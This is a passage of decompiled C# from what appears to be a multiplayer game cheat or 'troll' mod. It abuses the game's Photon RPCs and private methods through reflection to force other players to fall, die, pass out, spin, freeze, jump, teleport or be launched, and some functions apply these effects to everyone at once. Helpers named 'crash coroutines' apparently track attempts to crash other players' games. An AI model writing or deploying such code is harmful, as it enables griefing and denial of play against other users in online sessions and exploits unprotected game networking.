				activeCrashCoroutines.Add(coroutine);
			}
		}

		public static void StopTrollEffects(Character target)
		{
			if (!(target == null) && !(coroutineRunner == null) && activeTrollEffects.ContainsKey(target))
			{
				coroutineRunner.StopCoroutine(activeTrollEffects[target]);
				activeTrollEffects.Remove(target);
			}
		}

		public static void StopAllTrollEffects()
		{
			if (coroutineRunner == null)
			{
				return;
			}
			foreach (Coroutine value in activeTrollEffects.Values)
			{
				if (value != null)
				{
					coroutineRunner.StopCoroutine(value);
				}
			}
			activeTrollEffects.Clear();
		}

		public static void StopAllCrashCoroutines()
		{
			if (coroutineRunner == null)
			{
				return;
			}
			foreach (Coroutine activeCrashCoroutine in activeCrashCoroutines)
			{
				if (activeCrashCoroutine != null)
				{
					try
					{
						coroutineRunner.StopCoroutine(activeCrashCoroutine);
					}
					catch
					{
					}
				}
			}
			activeCrashCoroutines.Clear();
			Debug.Log((object)"[Crash] Stopped all active crash coroutines");
		}

		public static MonoBehaviour GetCoroutineRunner()
		{
			return coroutineRunner;
		}
	}
	public static class PlayerManipulation
	{
		private sealed class <AntigravCoroutine>d__26 : IEnumerator<object>, IDisposable, IEnumerator
		{
			private int <>1__state;

			private object <>2__current;

			public Character target;

			public float duration;

			private float <elapsed>5__2;

			object IEnumerator<object>.Current
			{
				get
				{
					return <>2__current;
				}
			}

			object IEnumerator.Current
			{
				get
				{
					return <>2__current;
				}
			}
			public <AntigravCoroutine>d__26(int <>1__state)
			{
				this.<>1__state = <>1__state;
			}
			void IDisposable.Dispose()
			{
				<>1__state = -2;
			}

			private bool MoveNext()
			{
				switch (<>1__state)
				{
				default:
					return false;
				case 0:
					<>1__state = -1;
					<elapsed>5__2 = 0f;
					break;
				case 1:
					<>1__state = -1;
					break;
				}
				if (<elapsed>5__2 < duration && target != null && !target.data.dead)
				{
					try
					{
						MethodInfo method = typeof(Character).GetMethod("AddForce", BindingFlags.Instance | BindingFlags.NonPublic, null, new Type[3]
						{
							typeof(Vector3),
							typeof(float),
							typeof(float)
						}, null);
						if (method != null)
						{
							method.Invoke(target, new object[3]
							{
								Vector3.up * 9.81f * 0.5f,
								1f,
								1f
							});
						}
						else if (target.refs != null && target.refs.ragdoll != null)
						{
							foreach (Bodypart part in target.refs.ragdoll.partList)
							{
								if (part != null && part.Rig != null)
								{
									part.Rig.AddForce(Vector3.up * 9.81f * 0.5f, (ForceMode)5);
								}
							}
						}
					}
					catch
					{
					}
					<elapsed>5__2 += Time.deltaTime;
					<>2__current = null;
					<>1__state = 1;
					return true;
				}
				return false;
			}

			bool IEnumerator.MoveNext()
			{
				return this.MoveNext();
			}
			void IEnumerator.Reset()
			{
				throw new NotSupportedException();
			}
		}
		private sealed class <FreezePlayerCoroutine>d__31 : IEnumerator<object>, IDisposable, IEnumerator
		{
			private int <>1__state;

			private object <>2__current;

			public Character target;

			public float duration;

			private float <elapsed>5__2;

			object IEnumerator<object>.Current
			{
				get
				{
					return <>2__current;
				}
			}

			object IEnumerator.Current
			{
				get
				{
					return <>2__current;
				}
			}
			public <FreezePlayerCoroutine>d__31(int <>1__state)
			{
				this.<>1__state = <>1__state;
			}
			void IDisposable.Dispose()
			{
				<>1__state = -2;
			}

			private bool MoveNext()
			{
				switch (<>1__state)
				{
				default:
					return false;
				case 0:
					<>1__state = -1;
					<elapsed>5__2 = 0f;
					break;
				case 1:
					<>1__state = -1;
					break;
				}
				if (<elapsed>5__2 < duration && target != null && !target.data.dead)
				{
					try
					{
						if (target.input != null)
						{
							target.input.movementInput = Vector2.zero;
							target.input.jumpIsPressed = false;
							target.input.sprintIsPressed = false;
						}
						if (target.refs != null && target.refs.ragdoll != null)
						{
							foreach (Bodypart part in target.refs.ragdoll.partList)
							{
								if (part != null && part.Rig != null)
								{
									part.Rig.linearVelocity = Vector3.zero;
									part.Rig.angularVelocity = Vector3.zero;
								}
							}
						}
					}
					catch
					{
					}
					<elapsed>5__2 += Time.deltaTime;
					<>2__current = null;
					<>1__state = 1;
					return true;
				}
				return false;
			}

			bool IEnumerator.MoveNext()
			{
				return this.MoveNext();
			}
			void IEnumerator.Reset()
			{
				throw new NotSupportedException();
			}
		}
		private sealed class <JumpRepeatedlyCoroutine>d__29 : IEnumerator<object>, IDisposable, IEnumerator
		{
			private int <>1__state;

			private object <>2__current;

			public float interval;

			public Character target;

			public float duration;

			private float <elapsed>5__2;

			private float <lastJumpTime>5__3;

			object IEnumerator<object>.Current
			{
				get
				{
					return <>2__current;
				}
			}

			object IEnumerator.Current
			{
				get
				{
					return <>2__current;
				}
			}
			public <JumpRepeatedlyCoroutine>d__29(int <>1__state)
			{
				this.<>1__state = <>1__state;
			}
			void IDisposable.Dispose()
			{
				<>1__state = -2;
			}

			private bool MoveNext()
			{
				switch (<>1__state)
				{
				default:
					return false;
				case 0:
					<>1__state = -1;
					<elapsed>5__2 = 0f;
					<lastJumpTime>5__3 = 0f;
					break;
				case 1:
					<>1__state = -1;
					break;
				}
				if (<elapsed>5__2 < duration && target != null && !target.data.dead)
				{
					if (<elapsed>5__2 - <lastJumpTime>5__3 >= interval)
					{
						try
						{
							MethodInfo method = ((object)target.photonView).GetType().GetMethod("JumpRpc", BindingFlags.Instance | BindingFlags.Public);
							if (method != null)
							{
								method.Invoke(target.photonView, new object[1] { true });
							}
						}
						catch
						{
						}
						<lastJumpTime>5__3 = <elapsed>5__2;
					}
					<elapsed>5__2 += Time.deltaTime;
					<>2__current = null;
					<>1__state = 1;
					return true;
				}
				TrollHelpers.StopTrollEffects(target);
				return false;
			}

			bool IEnumerator.MoveNext()
			{
				return this.MoveNext();
			}
			void IEnumerator.Reset()
			{
				throw new NotSupportedException();
			}
		}
		private sealed class <SpinPlayerCoroutine>d__18 : IEnumerator<object>, IDisposable, IEnumerator
		{
			private int <>1__state;

			private object <>2__current;

			public Character target;

			public float spinSpeed;

			public float duration;

			private float <elapsed>5__2;

			object IEnumerator<object>.Current
			{
				get
				{
					return <>2__current;
				}
			}

			object IEnumerator.Current
			{
				get
				{
					return <>2__current;
				}
			}
			public <SpinPlayerCoroutine>d__18(int <>1__state)
			{
				this.<>1__state = <>1__state;
			}
			void IDisposable.Dispose()
			{
				<>1__state = -2;
			}

			private bool MoveNext()
			{
				switch (<>1__state)
				{
				default:
					return false;
				case 0:
					<>1__state = -1;
					<elapsed>5__2 = 0f;
					break;
				case 1:
					<>1__state = -1;
					break;
				}
				if (<elapsed>5__2 < duration && target != null && !target.data.dead)
				{
					try
					{
						if (target.refs != null && target.refs.ragdoll != null)
						{
							Vector3 angularVelocity = default(Vector3);
							(angularVelocity)..ctor(0f, spinSpeed, 0f);
							foreach (Bodypart part in target.refs.ragdoll.partList)
							{
								if (part != null && part.Rig != null)
								{
									part.Rig.angularVelocity = angularVelocity;
									Vector3 val = target.Center - part.Rig.worldCenterOfMass;
									if ((val).magnitude > 0.1f)
									{
										part.Rig.AddForce((val).normalized * 5f, (ForceMode)5);
									}
								}
							}
						}
					}
					catch
					{
					}
					<elapsed>5__2 += Time.deltaTime;
					<>2__current = null;
					<>1__state = 1;
					return true;
				}
				try
				{
					if (target != null && target.refs != null && target.refs.ragdoll != null)
					{
						foreach (Bodypart part2 in target.refs.ragdoll.partList)
						{
							if (part2 != null && part2.Rig != null)
							{
								part2.Rig.angularVelocity = Vector3.zero;
							}
						}
					}
				}
				catch
				{
				}
				TrollHelpers.StopTrollEffects(target);
				return false;
			}

			bool IEnumerator.MoveNext()
			{
				return this.MoveNext();
			}
			void IEnumerator.Reset()
			{
				throw new NotSupportedException();
			}
		}
		private sealed class <WalkOffCliffCoroutine>d__2 : IEnumerator<object>, IDisposable, IEnumerator
		{
			private int <>1__state;

			private object <>2__current;

			public Character target;

			private float <duration>5__2;

			private float <elapsed>5__3;

			object IEnumerator<object>.Current
			{
				get
				{
					return <>2__current;
				}
			}

			object IEnumerator.Current
			{
				get
				{
					return <>2__current;
				}
			}
			public <WalkOffCliffCoroutine>d__2(int <>1__state)
			{
				this.<>1__state = <>1__state;
			}
			void IDisposable.Dispose()
			{
				<>1__state = -2;
			}

			private bool MoveNext()
			{
				switch (<>1__state)
				{
				default:
					return false;
				case 0:
					<>1__state = -1;
					<duration>5__2 = 3f;
					<elapsed>5__3 = 0f;
					break;
				case 1:
					<>1__state = -1;
					break;
				}
				if (<elapsed>5__3 < <duration>5__2 && target != null && target.input != null)
				{
					FieldInfo field = typeof(CharacterInput).GetField("movementInput", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
					if (field != null)
					{
						Vector2 val = default(Vector2);
						((Vector2)(ref val))..ctor(0f, 1f);
						field.SetValue(target.input, val);
					}
					<elapsed>5__3 += Time.deltaTime;
					<>2__current = null;
					<>1__state = 1;
					return true;
				}
				if (target != null && target.input != null)
				{
					FieldInfo field2 = typeof(CharacterInput).GetField("movementInput", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
					if (field2 != null)
					{
						field2.SetValue(target.input, Vector2.zero);
					}
				}
				return false;
			}

			bool IEnumerator.MoveNext()
			{
				return this.MoveNext();
			}
			void IEnumerator.Reset()
			{
				throw new NotSupportedException();
			}
		}

		public static void MakePlayerFall(Character target, float seconds = 5f, bool includeSelf = false)
		{
			if (TrollHelpers.ShouldSkipPlayer(target, includeSelf))
			{
				return;
			}
			if (TrollHelpers.CallRPCMethod(target, "RPCA_Fall", RpcTarget.All, seconds))
			{
				PhotonView photonView = target.photonView;
				object obj;
				if (photonView == null)
				{
					obj = null;
				}
				else
				{
					Player owner = photonView.Owner;
					obj = ((owner != null) ? owner.NickName : null);
				}
				if (obj == null)
				{
					obj = "Unknown";
				}
				Debug.Log((object)$"[Troll] Made {obj} fall for {seconds} seconds!");
			}
			else
			{
				Debug.LogError((object)"[Troll] Failed to make player fall - RPC call failed");
			}
		}

		public static void MakePlayerWalkOffCliff(Character target, bool includeSelf = false)
		{
			if (TrollHelpers.ShouldSkipPlayer(target, includeSelf))
			{
				return;
			}
			try
			{
				if (target.data == null || target.input == null)
				{
					return;
				}
				Vector3 lookDirection = target.data.lookDirection;
				lookDirection.y = 0f;
				(lookDirection).Normalize();
				FieldInfo field = typeof(CharacterInput).GetField("movementInput", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
				if (field != null)
				{
					Vector2 val = default(Vector2);
					((Vector2)(ref val))..ctor(0f, 1f);
					field.SetValue(target.input, val);
					MonoBehaviour coroutineRunner = TrollHelpers.GetCoroutineRunner();
					if (coroutineRunner != null)
					{
						coroutineRunner.StartCoroutine(WalkOffCliffCoroutine(target, lookDirection));
					}
					Debug.Log((object)("[Troll] Made " + target.photonView.Owner.NickName + " walk off cliff!"));
					return;
				}
				Vector3 val2 = lookDirection * 10f;
				if (target.refs != null && target.refs.ragdoll != null && target.refs.ragdoll.partList != null)
				{
					foreach (Bodypart part in target.refs.ragdoll.partList)
					{
						if (part != null && part.Rig != null)
						{
							part.Rig.AddForce(val2, (ForceMode)2);
						}
					}
				}
				Debug.Log((object)("[Troll] Applied forward force to " + target.photonView.Owner.NickName + "!"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Troll] Failed to make player walk off cliff: " + ex.Message));
			}
		}

		[IteratorStateMachine(typeof(<WalkOffCliffCoroutine>d__2))]
		private static IEnumerator WalkOffCliffCoroutine(Character target, Vector3 direction)
		{
			return new <WalkOffCliffCoroutine>d__2(0)
			{
				target = target
			};
		}

		public static void UnFallPlayer(Character target, bool includeSelf = false)
		{
			if (TrollHelpers.ShouldSkipPlayer(target, includeSelf))
			{
				return;
			}
			if (TrollHelpers.CallRPCMethod(target, "RPCA_UnFall", RpcTarget.All))
			{
				PhotonView photonView = target.photonView;
				object obj;
				if (photonView == null)
				{
					obj = null;
				}
				else
				{
					Player owner = photonView.Owner;
					obj = ((owner != null) ? owner.NickName : null);
				}
				if (obj == null)
				{
					obj = "Unknown";
				}
				Debug.Log((object)("[Troll] Stopped " + (string)obj + " from falling!"));
			}
			else
			{
				Debug.LogError((object)"[Troll] Failed to unfall player - RPC call failed");
			}
		}

		public static void KillPlayer(Character target, bool includeSelf = false)
		{
			if (TrollHelpers.ShouldSkipPlayer(target, includeSelf))
			{
				return;
			}
			if (TrollHelpers.CallRPCMethod(target, "RPCA_Die", RpcTarget.All, Vector3.zero))
			{
				PhotonView photonView = target.photonView;
				object obj;
				if (photonView == null)
				{
					obj = null;
				}
				else
				{
					Player owner = photonView.Owner;
					obj = ((owner != null) ? owner.NickName : null);
				}
				if (obj == null)
				{
					obj = "Unknown";
				}
				Debug.Log((object)("[Troll] Killed " + (string)obj + "!"));
			}
			else
			{
				Debug.LogError((object)"[Troll] Failed to kill player - RPC call failed");
			}
		}

		public static void RevivePlayer(Character target, bool applyStatus = false, bool includeSelf = false)
		{
			if (TrollHelpers.ShouldSkipPlayer(target, includeSelf))
			{
				return;
			}
			if (TrollHelpers.CallRPCMethod(target, "RPCA_Revive", RpcTarget.All, applyStatus))
			{
				PhotonView photonView = target.photonView;
				object obj;
				if (photonView == null)
				{
					obj = null;
				}
				else
				{
					Player owner = photonView.Owner;
					obj = ((owner != null) ? owner.NickName : null);
				}
				if (obj == null)
				{
					obj = "Unknown";
				}
				Debug.Log((object)("[Troll] Revived " + (string)obj + "!"));
			}
			else
			{
				Debug.LogError((object)"[Troll] Failed to revive player - RPC call failed");
			}
		}

		public static void RevivePlayerAtPosition(Character target, Vector3 position, bool applyStatus = false, bool includeSelf = false)
		{
			if (!(target == null) && !((Object)(object)target.photonView == (Object)null) && !TrollHelpers.ShouldSkipPlayer(target, includeSelf))
			{
				if (TrollHelpers.CallRPCMethod(target, "RPCA_ReviveAtPosition", RpcTarget.All, position, applyStatus))
				{
					Debug.Log((object)("[Troll] Revived " + target.photonView.Owner.NickName + " at position!"));
				}
				else
				{
					Debug.LogError((object)"[Troll] Failed to revive player at position - RPC call failed");
				}
			}
		}

		public static void StickPlayerBodyPart(Character target, BodypartType bodypartType, Vector3 position, STATUSTYPE statusType = 0, float statusAmount = 0f, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf))
			{
				return;
			}
			if (TrollHelpers.CallRPCMethod(target, "RPCA_Stick", RpcTarget.All, bodypartType, position, position, statusType, statusAmount))
			{
				PhotonView photonView = target.photonView;
				object obj;
				if (photonView == null)
				{
					obj = null;
				}
				else
				{
					Player owner = photonView.Owner;
					obj = ((owner != null) ? owner.NickName : null);
				}
				if (obj == null)
				{
					obj = "Unknown";
				}
				Debug.Log((object)$"[Troll] Stuck {obj}'s {bodypartType}!");
			}
			else
			{
				Debug.LogError((object)"[Troll] Failed to stick player body part - RPC call failed");
			}
		}

		public static void UnstickPlayer(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf))
			{
				return;
			}
			if (TrollHelpers.CallRPCMethod(target, "RPCA_Unstick", RpcTarget.All))
			{
				PhotonView photonView = target.photonView;
				object obj;
				if (photonView == null)
				{
					obj = null;
				}
				else
				{
					Player owner = photonView.Owner;
					obj = ((owner != null) ? owner.NickName : null);
				}
				if (obj == null)
				{
					obj = "Unknown";
				}
				Debug.Log((object)("[Troll] Unstuck " + (string)obj + "!"));
			}
			else
			{
				Debug.LogError((object)"[Troll] Failed to unstick player - RPC call failed");
			}
		}

		public static void StartCarryPlayer(Character carrier, Character target, bool includeSelf = false)
		{
			if (carrier == null || target == null || (Object)(object)carrier.photonView == (Object)null || (Object)(object)target.photonView == (Object)null || (!includeSelf && (carrier.photonView.IsMine || target.photonView.IsMine)))
			{
				return;
			}
			try
			{
				carrier.photonView.RPC("RPCA_StartCarry", RpcTarget.All, new object[1] { target.photonView });
				Debug.Log((object)("[Troll] Made " + carrier.photonView.Owner.NickName + " carry " + target.photonView.Owner.NickName + "!"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Troll] Failed to start carry: " + ex.Message));
			}
		}

		public static void DropCarriedPlayer(Character carrier, Character target, bool includeSelf = false)
		{
			if (carrier == null || target == null || (Object)(object)carrier.photonView == (Object)null || (Object)(object)target.photonView == (Object)null || (!includeSelf && (carrier.photonView.IsMine || target.photonView.IsMine)))
			{
				return;
			}
			try
			{
				carrier.photonView.RPC("RPCA_Drop", RpcTarget.All, new object[1] { target.photonView });
				Debug.Log((object)("[Troll] Made " + carrier.photonView.Owner.NickName + " drop " + target.photonView.Owner.NickName + "!"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Troll] Failed to drop carried player: " + ex.Message));
			}
		}

		public static void ZombifyPlayer(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf))
			{
				return;
			}
			Vector3 val = target.Center + Vector3.up * 0.2f + Vector3.forward * 0.1f;
			if (TrollHelpers.CallRPCMethod(target, "RPCA_Zombify", RpcTarget.All, val))
			{
				PhotonView photonView = target.photonView;
				object obj;
				if (photonView == null)
				{
					obj = null;
				}
				else
				{
					Player owner = photonView.Owner;
					obj = ((owner != null) ? owner.NickName : null);
				}
				if (obj == null)
				{
					obj = "Unknown";
				}
				Debug.Log((object)("[Troll] Zombified " + (string)obj + "!"));
			}
			else
			{
				Debug.LogError((object)"[Troll] Failed to zombify player - RPC call failed");
			}
		}

		public static void MakePlayerPassOut(Character target, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf))
			{
				return;
			}
			if (TrollHelpers.CallRPCMethod(target, "RPCA_PassOut", RpcTarget.All))
			{
				PhotonView photonView = target.photonView;
				object obj;
				if (photonView == null)
				{
					obj = null;
				}
				else
				{
					Player owner = photonView.Owner;
					obj = ((owner != null) ? owner.NickName : null);
				}
				if (obj == null)
				{
					obj = "Unknown";
				}
				Debug.Log((object)("[Troll] Made " + (string)obj + " pass out!"));
			}
			else
			{
				Debug.LogError((object)"[Troll] Failed to make player pass out - RPC call failed");
			}
		}

		public static void LaunchPlayer(Character target, Vector3 direction, float force = 50f, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf))
			{
				return;
			}
			try
			{
				Vector3 val = (direction).normalized * force;
				if (target.refs != null && target.refs.ragdoll != null && target.refs.ragdoll.partList != null)
				{
					foreach (Bodypart part in target.refs.ragdoll.partList)
					{
						if (part != null && part.Rig != null)
						{
							part.Rig.AddForceAtPosition(val, part.Rig.worldCenterOfMass, (ForceMode)1);
							part.Rig.AddForce(val * 0.5f, (ForceMode)1);
						}
					}
					Rigidbody component = ((Component)target).GetComponent<Rigidbody>();
					if (component != null)
					{
						component.AddForce(val, (ForceMode)1);
					}
					Player owner = target.photonView.Owner;
					Debug.Log((object)string.Format("[Troll] Launched {0} with force {1} (using bodypart impulse)!", ((owner != null) ? owner.NickName : null) ?? "Unknown", force));
					return;
				}
				MethodInfo method = typeof(Character).GetMethod("AddForceAtPosition", BindingFlags.Instance | BindingFlags.NonPublic, null, new Type[3]
				{
					typeof(Vector3),
					typeof(Vector3),
					typeof(float)
				}, null);
				if (method != null)
				{
					Vector3 center = target.Center;
					method.Invoke(target, new object[3] { val, center, 10f });
					Player owner2 = target.photonView.Owner;
					Debug.Log((object)string.Format("[Troll] Launched {0} with force {1} (using AddForceAtPosition)!", ((owner2 != null) ? owner2.NickName : null) ?? "Unknown", force));
					return;
				}
				MethodInfo method2 = typeof(Character).GetMethod("AddForce", BindingFlags.Instance | BindingFlags.NonPublic, null, new Type[3]
				{
					typeof(Vector3),
					typeof(float),
					typeof(float)
				}, null);
				if (method2 != null)
				{
					method2.Invoke(target, new object[3] { val, 1f, 1f });
					Player owner3 = target.photonView.Owner;
					Debug.Log((object)string.Format("[Troll] Launched {0} with force {1}!", ((owner3 != null) ? owner3.NickName : null) ?? "Unknown", force));
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Troll] Failed to launch player: " + ex.Message));
			}
		}

		public static void LaunchPlayerUp(Character target, float force = 50f, bool includeSelf = false)
		{
			LaunchPlayer(target, Vector3.up, force, includeSelf);
		}

		public static void LaunchPlayerTowardsMe(Character target, float force = 50f, bool includeSelf = false)
		{
			if (!(Character.localCharacter == null) && !(target == null))
			{
				Vector3 val = Character.localCharacter.Center - target.Center;
				Vector3 normalized = (val).normalized;
				LaunchPlayer(target, normalized, force, includeSelf);
			}
		}

		public static void LaunchPlayerAway(Character target, float force = 50f, bool includeSelf = false)
		{
			if (!(Character.localCharacter == null) && !(target == null))
			{
				Vector3 val = target.Center - Character.localCharacter.Center;
				Vector3 normalized = (val).normalized;
				LaunchPlayer(target, normalized, force, includeSelf);
			}
		}

		public static void MakePlayerSpin(Character target, float spinSpeed = 720f, float duration = 5f, bool includeSelf = false)
		{
			if (!(target == null) && !((Object)(object)target.photonView == (Object)null) && !TrollHelpers.ShouldSkipPlayer(target, includeSelf))
			{
				MonoBehaviour coroutineRunner = TrollHelpers.GetCoroutineRunner();
				if (!(coroutineRunner == null))
				{
					TrollHelpers.StopTrollEffects(target);
					Coroutine coroutine = coroutineRunner.StartCoroutine(SpinPlayerCoroutine(target, spinSpeed, duration));
					TrollHelpers.RegisterTrollEffect(target, coroutine);
					Debug.Log((object)("[Troll] Making " + target.photonView.Owner.NickName + " spin!"));
				}
			}
		}

		[IteratorStateMachine(typeof(<SpinPlayerCoroutine>d__18))]
		private static IEnumerator SpinPlayerCoroutine(Character target, float spinSpeed, float duration)
		{
			return new <SpinPlayerCoroutine>d__18(0)
			{
				target = target,
				spinSpeed = spinSpeed,
				duration = duration
			};
		}

		public static void TeleportPlayerRandomly(Character target, float minDistance = 30f, float maxDistance = 100f, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf))
			{
				return;
			}
			try
			{
				Vector3 val = target.Center + Random.onUnitSphere * Random.Range(minDistance, maxDistance);
				val.y = target.Center.y;
				RaycastHit val2 = default(RaycastHit);
				if (Physics.Raycast(val + Vector3.up * 100f, Vector3.down, ref val2, 200f))
				{
					val = (val2).point + Vector3.up * 2f;
				}
				target.photonView.RPC("WarpPlayerRPC", RpcTarget.All, new object[2] { val, true });
				Debug.Log((object)("[Troll] Teleported " + target.photonView.Owner.NickName + " randomly!"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Troll] Failed to teleport player: " + ex.Message));
			}
		}

		public static void TeleportPlayerToMe(Character target, bool includeSelf = false)
		{
			if (!(target == null) && !(Character.localCharacter == null))
			{
				TeleportPlayerToPosition(target, Character.localCharacter.Center + Vector3.up * 2f, includeSelf);
			}
		}

		public static void TeleportPlayerToPosition(Character target, Vector3 position, bool includeSelf = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf))
			{
				return;
			}
			try
			{
				target.photonView.RPC("WarpPlayerRPC", RpcTarget.All, new object[2] { position, true });
				Debug.Log((object)("[Troll] Teleported " + target.photonView.Owner.NickName + " to position!"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Troll] Failed to teleport player: " + ex.Message));
			}
		}

		public static void MakePlayerRagdoll(Character target, float duration = 5f)
		{
			MakePlayerFall(target, duration);
		}

		public static void GrabPlayer(Character target)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null || target.photonView.IsMine || Character.localCharacter == null)
			{
				return;
			}
			try
			{
				CharacterGrabbing component = ((Component)Character.localCharacter).GetComponent<CharacterGrabbing>();
				if (!(component == null))
				{
					MethodInfo method = typeof(CharacterGrabbing).GetMethod("RPCA_GrabAttach", BindingFlags.Instance | BindingFlags.NonPublic);
					if (method != null)
					{
						BodypartType val = (BodypartType)2;
						Vector3 zero = Vector3.zero;
						method.Invoke(component, new object[3]
						{
							target.photonView,
							(int)val,
							zero
						});
						Debug.Log((object)("[Troll] Grabbed " + target.photonView.Owner.NickName + "!"));
					}
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Troll] Failed to grab player: " + ex.Message));
			}
		}

		public static void ThrowPlayer(Character target, Vector3 direction, float force = 30f)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null)
			{
				return;
			}
			try
			{
				Vector3 val = (direction).normalized * force;
				MethodInfo method = typeof(Character).GetMethod("AddForce", BindingFlags.Instance | BindingFlags.NonPublic, null, new Type[3]
				{
					typeof(Vector3),
					typeof(float),
					typeof(float)
				}, null);
				if (method != null)
				{
					method.Invoke(target, new object[3] { val, 1f, 1f });
					Debug.Log((object)("[Troll] Threw " + target.photonView.Owner.NickName + "!"));
				}
				else
				{
					if (target.refs == null || !(target.refs.ragdoll != null))
					{
						return;
					}
					foreach (Bodypart part in target.refs.ragdoll.partList)
					{
						if (part != null && part.Rig != null)
						{
							part.Rig.AddForce(val, (ForceMode)5);
						}
					}
					Debug.Log((object)("[Troll] Threw " + target.photonView.Owner.NickName + " (using direct bodypart force)!"));
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Troll] Failed to throw player: " + ex.Message));
			}
		}

		public static void ApplyAntigrav(Character target, float duration = 10f, bool includeSelf = false)
		{
			if (!(target == null) && !((Object)(object)target.photonView == (Object)null) && !TrollHelpers.ShouldSkipPlayer(target, includeSelf))
			{
				MonoBehaviour coroutineRunner = TrollHelpers.GetCoroutineRunner();
				if (!(coroutineRunner == null))
				{
					coroutineRunner.StartCoroutine(AntigravCoroutine(target, duration));
				}
			}
		}

		[IteratorStateMachine(typeof(<AntigravCoroutine>d__26))]
		private static IEnumerator AntigravCoroutine(Character target, float duration)
		{
			return new <AntigravCoroutine>d__26(0)
			{
				target = target,
				duration = duration
			};
		}

		public static void MakePlayerGlow(Character target, bool includeSelf = false)
		{
			if (target == null || target.refs == null || target.refs.afflictions == null || (!includeSelf && (Object)(object)target.photonView != (Object)null && target.photonView.IsMine))
			{
				return;
			}
			try
			{
				MethodInfo method = typeof(CharacterAfflictions).GetMethod("AddAffliction", BindingFlags.Instance | BindingFlags.Public);
				if (!(method != null))
				{
					return;
				}
				Type type = Type.GetType("Affliction_Glowing");
				if (type != null)
				{
					object obj = Activator.CreateInstance(type);
					method.Invoke(target.refs.afflictions, new object[1] { obj });
					PhotonView photonView = target.photonView;
					object obj2;
					if (photonView == null)
					{
						obj2 = null;
					}
					else
					{
						Player owner = photonView.Owner;
						obj2 = ((owner != null) ? owner.NickName : null);
					}
					if (obj2 == null)
					{
						obj2 = "player";
					}
					Debug.Log((object)("[Troll] Made " + (string)obj2 + " glow!"));
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Troll] Failed to make player glow: " + ex.Message));
			}
		}

		public static void MakePlayerJumpRepeatedly(Character target, float interval = 0.5f, float duration = 5f, bool includeSelf = false)
		{
			if (!(target == null) && !((Object)(object)target.photonView == (Object)null) && !TrollHelpers.ShouldSkipPlayer(target, includeSelf))
			{
				MonoBehaviour coroutineRunner = TrollHelpers.GetCoroutineRunner();
				if (!(coroutineRunner == null))
				{
					TrollHelpers.StopTrollEffects(target);
					Coroutine coroutine = coroutineRunner.StartCoroutine(JumpRepeatedlyCoroutine(target, interval, duration));
					TrollHelpers.RegisterTrollEffect(target, coroutine);
					Debug.Log((object)("[Troll] Making " + target.photonView.Owner.NickName + " jump repeatedly!"));
				}
			}
		}

		[IteratorStateMachine(typeof(<JumpRepeatedlyCoroutine>d__29))]
		private static IEnumerator JumpRepeatedlyCoroutine(Character target, float interval, float duration)
		{
			return new <JumpRepeatedlyCoroutine>d__29(0)
			{
				target = target,
				interval = interval,
				duration = duration
			};
		}

		public static void FreezePlayer(Character target, float duration = 5f, bool includeSelf = false)
		{
			if (!(target == null) && !((Object)(object)target.photonView == (Object)null) && !TrollHelpers.ShouldSkipPlayer(target, includeSelf))
			{
				MonoBehaviour coroutineRunner = TrollHelpers.GetCoroutineRunner();
				if (!(coroutineRunner == null))
				{
					coroutineRunner.StartCoroutine(FreezePlayerCoroutine(target, duration));
					Debug.Log((object)("[Troll] Freezing " + target.photonView.Owner.NickName + "!"));
				}
			}
		}

		[IteratorStateMachine(typeof(<FreezePlayerCoroutine>d__31))]
		private static IEnumerator FreezePlayerCoroutine(Character target, float duration)
		{
			return new <FreezePlayerCoroutine>d__31(0)
			{
				target = target,
				duration = duration
			};
		}

		public static void MakeEveryoneJump(bool includeSelf = false)
		{
			foreach (Character allCharacter in Character.AllCharacters)
			{
				if (!(allCharacter != null) || !((Object)(object)allCharacter.photonView != (Object)null) || (!includeSelf && allCharacter.photonView.IsMine))
				{
					continue;
				}
				try
				{
					MethodInfo method = ((object)allCharacter.photonView).GetType().GetMethod("JumpRpc", BindingFlags.Instance | BindingFlags.Public);
					if (method != null)
					{
						method.Invoke(allCharacter.photonView, new object[1] { true });
					}
				}
				catch
				{
				}
			}
			Debug.Log((object)"[Troll] Made everyone jump!");
		}

		public static void MakeEveryoneFall(float seconds = 5f, bool includeSelf = false)
		{
			foreach (Character allCharacter in Character.AllCharacters)
			{
				if (allCharacter != null)
				{
					MakePlayerFall(allCharacter, seconds, includeSelf);
				}
			}
		}

		public static void MakeEveryonePassOut(bool includeSelf = false)
		{
			foreach (Character allCharacter in Character.AllCharacters)
			{
				if (allCharacter != null)
				{
					MakePlayerPassOut(allCharacter, includeSelf);
				}
			}
		}

		public static void LaunchEveryoneUp(float force = 50f, bool includeSelf = false)
		{
			foreach (Character allCharacter in Character.AllCharacters)
			{
				if (allCharacter != null)
				{
					LaunchPlayerUp(allCharacter, force, includeSelf);
				}
			}
		}

		public static void TeleportEveryoneToMe(bool includeSelf = false)
		{
			if (Character.localCharacter == null)
			{
				return;
